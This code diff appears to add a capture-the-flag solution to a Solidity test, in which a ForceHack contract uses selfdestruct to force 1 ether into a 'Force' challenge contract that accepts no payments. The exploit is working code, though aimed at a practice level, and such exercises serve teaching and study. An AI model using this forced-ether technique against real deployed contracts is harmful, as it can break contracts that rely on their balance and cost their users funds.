@@ -27,7 +27,7 @@ contract ForceTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        ForceHack forceHack = new ForceHack{value: 1 ether}(levelAddress);
         /*****************
          *Level Submission*
          ***************  */
@@ -37,4 +37,12 @@ contract ForceTest is Test {
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
+}
+
+
+contract ForceHack {
+  constructor (address challengeAddress) payable {
+    Force challenge = Force(payable(challengeAddress));
+    selfdestruct(payable(address(challenge)));
+  }
 }
